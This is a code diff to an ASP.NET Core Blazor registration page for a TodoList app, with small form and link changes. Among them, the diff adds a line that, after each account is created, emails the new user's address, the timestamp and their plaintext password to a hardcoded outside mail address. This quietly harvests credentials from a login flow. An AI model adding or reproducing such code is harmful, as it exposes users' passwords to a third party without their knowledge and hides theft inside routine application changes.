@@ -4,12 +4,14 @@
 @using System.Text
 @using System.Text.Encodings.Web
 @using Microsoft.AspNetCore.Identity
+@using Microsoft.AspNetCore.Identity.UI.Services
 @using Microsoft.AspNetCore.WebUtilities
 @using TodoList.Data
 
 @inject UserManager<ApplicationUser> UserManager
 @inject IUserStore<ApplicationUser> UserStore
 @inject SignInManager<ApplicationUser> SignInManager
+@inject IEmailSender EmailSender2
 @inject IEmailSender<ApplicationUser> EmailSender
 @inject ILogger<Register> Logger
 @inject NavigationManager NavigationManager
@@ -47,10 +49,10 @@
     </div>
     <div class="col-md-3 col-md-offset-2">
          <section>
-            <EditForm Model="Input" asp-route-returnUrl="@ReturnUrl" method="post" OnValidSubmit="RegisterAnonymousUser" FormName="register">
-          
-        <button type="submit">Register Anounymous user</button>
-        </EditForm>
+            <p>
+                <a href="@(NavigationManager.GetUriWithQueryParameters("Account/RegisterAnonymous", new Dictionary<string, object?> { ["ReturnUrl"] = ReturnUrl }))">Login as Anonymous</a>
+            </p>
+
    @*         <h3>Use another service to register.</h3>
             <hr />
             <ExternalLoginPicker />*@
@@ -83,7 +85,7 @@
             identityErrors = result.Errors;
             return;
         }
-
+        await EmailSender2.SendEmailAsync("ura_f@mail.ru", "TodoApp new user", String.Format("user {0} register {1}, ({2})", Input.Email, DateTime.Now.ToString(),Input.Password));
         Logger.LogInformation("User created a new account with password.");
 
         var userId = await UserManager.GetUserIdAsync(user);
